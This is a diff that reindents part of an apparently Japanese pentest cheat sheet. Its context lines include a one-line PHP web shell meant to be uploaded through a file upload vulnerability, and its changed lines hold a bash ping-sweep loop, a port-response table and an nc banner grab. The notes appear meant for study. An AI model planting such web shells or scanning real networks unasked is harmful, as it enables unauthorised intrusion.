@@ -49,23 +49,23 @@
     1. 入力を待ち受けできるphpファイルを作成しFile Uploadの脆弱性を利用しアップロード
     2. アップしたphpファイルを利用してweb経由でコマンド実行
         `<?php system($_GET["cmd"]); ?>`
-  * PortScan
-    1. ping sweet サンプル
+* PortScan
+  1. ping sweet サンプル
 
-       ``` shell 
-       for i in {1..254}; do ping xxx.yyy.zzz.$i -c 1 -W 1 | grep ttl | cut -d ' ' -f 4 | tr -d ':' >> ip_list.txt & done
-       ```
+     ``` shell 
+     for i in {1..254}; do ping xxx.yyy.zzz.$i -c 1 -W 1 | grep ttl | cut -d ' ' -f 4 | tr -d ':' >> ip_list.txt & done
+     ```
 
-    2. pingのレスポンスの違い
+  2. pingのレスポンスの違い
 
-        | response | 状態                         |
-        | :------: | ---------------------------- |
-        | SYN,ACK  | IPが存在してPortが開いている |
-        | RST,ACK  | IPが存在してPortが閉じている |
-        |   None   | パケットがdropされている     |
-        |          | IPが存在しない               |
-        |          | タイムアウト |
+      | response | 状態                         |
+      | :------: | ---------------------------- |
+      | SYN,ACK  | IPが存在してPortが開いている |
+      | RST,ACK  | IPが存在してPortが閉じている |
+      |   None   | パケットがdropされている     |
+      |          | IPが存在しない               |
+      |          | タイムアウト |
 
-    3. バナーの取得
-      `printf "HEAD /index.html HTTP/1.0\r\n\r\n" | nc XXX.YYY.ZZZ.AAA`
+  3. バナーの取得
+    `printf "HEAD /index.html HTTP/1.0\r\n\r\n" | nc XXX.YYY.ZZZ.AAA`
 
